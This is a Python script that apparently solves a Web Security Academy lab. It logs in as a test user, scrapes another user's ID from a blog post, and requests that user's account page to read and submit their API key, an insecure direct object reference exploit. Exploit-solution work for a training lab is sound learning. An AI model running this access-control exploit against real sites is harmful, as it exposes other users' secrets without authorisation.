import requests
from bs4 import BeautifulSoup
import re


s = requests.Session()
site = 'ac2f1f381e189b0380d24bae003400f9.web-security-academy.net'
login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

logindata = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter'
}
resp = s.post(login_url, data=logindata)
print(resp.status_code)


blogsite = 'https://ac2f1f381e189b0380d24bae003400f9.web-security-academy.net/post?postId=9'
resp = s.get(blogsite)
soup = BeautifulSoup(resp.text, 'html.parser')
carlos_userid = soup.find('a',text='carlos')['href'].split('=')[1]
print(carlos_userid)

# Now to get the API Key:
resp = s.get(url=f'https://{site}/my-account?id={carlos_userid}', data=logindata)
print(resp)
soup = BeautifulSoup(resp.text, 'html.parser')
div_text = soup.find('div', text=re.compile('API')).text
api_key = div_text.split(' ')[4]
print(api_key)

url = f'https://{site}/submitSolution'
resp = s.post(url, data={'answer': api_key})